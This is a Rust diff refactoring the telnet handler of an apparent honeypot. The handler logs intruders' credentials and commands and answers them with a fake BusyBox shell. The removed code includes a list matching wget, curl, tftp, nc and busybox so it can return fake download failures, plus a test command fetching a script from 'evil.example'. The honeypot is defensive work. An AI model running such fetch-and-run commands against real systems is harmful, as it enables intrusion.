@@ -1,15 +1,12 @@
 use crate::event::{Event, Kind};
 use crate::net::{graceful_close, read_line, write_all_timeout, App};
+use crate::shell::{self, Persona};
 use crate::util::{jitter_ms, strip_telnet_iac, truncate, MAX_FIELD};
 use std::net::SocketAddr;
 use tokio::net::TcpStream;
 
-const HELLO: &[u8] = b"\r\nBusyBox v1.36.1 (2023-11-07 18:26:41 UTC) built-in shell (ash)\r\n\
-      Enter 'help' for a list of built-in commands.\r\n\r\n";
-
 pub async fn handle(mut sock: TcpStream, peer: SocketAddr, app: App, port: u16) {
-    app.log
-        .emit(Event::new("telnet", port, peer, Kind::Connect));
+    app.emit(Event::new("telnet", port, peer, Kind::Connect));
     jitter_ms(app.jitter_ms.0, app.jitter_ms.1).await;
 
     // Refuse every option; do not enable echo/linemode features.
@@ -19,7 +16,7 @@ pub async fn handle(mut sock: TcpStream, peer: SocketAddr, app: App, port: u16) 
         app.read_timeout,
     )
     .await;
-    let _ = write_all_timeout(&mut sock, HELLO, app.read_timeout).await;
+    let _ = write_all_timeout(&mut sock, shell::motd(Persona::BusyBox), app.read_timeout).await;
     let _ = write_all_timeout(&mut sock, b"login: ", app.read_timeout).await;
 
     let mut stage: u8 = 0; // 0 user, 1 pass, 2 fake shell
@@ -49,7 +46,7 @@ pub async fn handle(mut sock: TcpStream, peer: SocketAddr, app: App, port: u16) 
                 stage = 1;
             }
             1 => {
-                app.log.emit(
+                app.emit(
                     Event::new("telnet", port, peer, Kind::Password)
                         .user(username.clone())
                         .pass(truncate(input, MAX_FIELD)),
@@ -66,57 +63,21 @@ pub async fn handle(mut sock: TcpStream, peer: SocketAddr, app: App, port: u16) 
                 }
                 if !input.is_empty() {
                     commands += 1;
-                    app.log.emit(
+                    app.emit(
                         Event::new("telnet", port, peer, Kind::Command)
                             .user(username.clone())
                             .data(truncate(input, MAX_FIELD)),
                     );
-                    let reply = fake_shell_response(input);
+                    let reply = shell::reply(Persona::BusyBox, input);
                     let _ = write_all_timeout(&mut sock, reply.as_bytes(), app.read_timeout).await;
                 }
-                let _ = write_all_timeout(&mut sock, b"# ", app.read_timeout).await;
+                let _ =
+                    write_all_timeout(&mut sock, shell::prompt(Persona::BusyBox), app.read_timeout)
+                        .await;
             }
         }
     }
 
-    app.log
-        .emit(Event::new("telnet", port, peer, Kind::Disconnect));
+    app.emit(Event::new("telnet", port, peer, Kind::Disconnect));
     graceful_close(sock).await;
-}
-
-/// Canned replies only. wget/curl never fetch. No host commands.
-pub fn fake_shell_response(cmd: &str) -> String {
-    let cmd_lower = cmd.to_ascii_lowercase();
-    let base = cmd_lower.split_whitespace().next().unwrap_or("");
-    match base {
-        "ls" => "bin  dev  etc  home  proc  tmp  usr  var\r\n".into(),
-        "pwd" => "/root\r\n".into(),
-        "whoami" => "root\r\n".into(),
-        "id" => "uid=0(root) gid=0(root)\r\n".into(),
-        "cat" => "cat: permission denied\r\n".into(),
-        "uname" => {
-            "Linux router 2.6.36 #1 SMP PREEMPT Fri Mar 14 11:26:04 CST 2014 mips unknown\r\n"
-                .into()
-        }
-        "ifconfig" | "ip" => {
-            "eth0      Link encap:Ethernet  HWaddr 00:1A:2B:3C:4D:5E\r\n          inet addr:192.168.1.1  Bcast:192.168.1.255  Mask:255.255.255.0\r\n".into()
-        }
-        "ps" => "  PID USER       VSZ STAT COMMAND\r\n    1 root      1236 S    /sbin/init\r\n  142 root      2056 S    httpd\r\n  199 root      1872 S    telnetd\r\n".into(),
-        "help" => "Built-in commands:\r\nls pwd whoami id uname ifconfig ps cat\r\n".into(),
-        "wget" | "curl" | "tftp" | "nc" | "busybox" => {
-            "Download failed: connection refused\r\n".into()
-        }
-        _ => format!("{base}: not found\r\n"),
-    }
-}
-
-#[cfg(test)]
-mod tests {
-    use super::*;
-
-    #[test]
-    fn wget_does_not_look_successful() {
-        let r = fake_shell_response("wget http://evil.example/a.sh");
-        assert!(r.contains("refused"));
-    }
 }
